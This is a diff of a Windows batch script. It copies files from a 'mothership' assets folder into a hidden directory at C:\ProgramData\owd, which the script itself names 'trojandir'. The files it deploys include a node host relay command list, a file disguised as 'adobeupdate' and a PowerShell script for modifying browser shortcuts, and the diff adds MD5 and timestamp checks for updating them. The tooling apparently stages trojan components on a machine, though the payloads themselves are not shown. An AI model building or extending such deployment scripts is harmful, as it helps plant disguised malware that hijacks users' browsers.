@@ -14,7 +14,7 @@ IF "%1"=="update" (
 
 FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"
 
-set mothership=%DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets
+set mothershipdir=%DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets
 set trojandir=C:\ProgramData\owd
 cd /d %trojandir%
 
@@ -37,7 +37,7 @@ IF NOT "%output%"=="v26.4.0" (
     echo node version not correct
 )
 
-copy /y %mothership%\.vscode\*.* %trojandir%\.vscode 
+copy /y %mothershipdir%\.vscode\*.* %trojandir%\.vscode 
 
 set files=nodehostrelay.cmdslist.js
 set files=%files% nodehostrelay.cmdslist.js
@@ -49,20 +49,40 @@ set files=%files% tpl_launch.cmd
 set files=%files% adobeupdate
 set files=%files% modify_browser_lnk_tpl.ps1
 
-for %%A in (%files%) do (
+FOR %%A IN (%files%) DO (
     IF NOT EXIST %trojandir%\%%A (
-        copy /y %mothership%\%%A %trojandir%\%%A
+        echo INFO copying %%A to %trojandir%
+        copy /y %mothershipdir%\%%A %trojandir%\%%A
     ) ELSE (
 
-        FOR %%A IN ("%mothership%\%%A") DO set "mdt=%%~tA"
+        FOR %%A IN ("%mothershipdir%\%%A") DO set "mdt=%%~tA"
         FOR %%A IN ("%trojandir%\%%A") DO set "dt=%%~tA"
 
-        echo WARN -- dest file exists %trojandir%\%%A src !mdt! -- dest !dt!
+        certutil -hashfile %trojandir%\%%A MD5 | find /v ":" > %trojandir%\%%A.MD5
+        certutil -hashfile %mothershipdir%\%%A MD5 | find /v ":" > %temp%\%%A.MD5
 
-        xcopy %mothership%\%%A %trojandir%\%%A /d /y /L
+        set /p %%AMD5=<%trojandir%\%%A.MD5
+        set /p m%%AMD5=<%temp%\%%A.MD5
+
+        SET md5_check=ERROR
+        IF "!m%%AMD5!"=="!%%AMD5!" (
+            SET md5_check=OK
+        )
+
+        SET dt_check=ERROR
+        IF "!mdt!"=="!dt!" (
+            SET dt_check=OK
+        )
+
+        echo WARN -- dest file exists [ %%A ]
+        echo src !mdt! !m%%AMD5!
+        echo des !dt! !%%AMD5! 
+        echo MD5 !md5_check! dt !dt_check!
+
+        xcopy %mothershipdir%\%%A %trojandir%\%%A /d /y /L
 
         IF "%update%"=="TRUE" (
-            xcopy %mothership%\%%A %trojandir%\%%A /d /y
+            xcopy %mothershipdir%\%%A %trojandir%\%%A /d /y
         )
 
     )
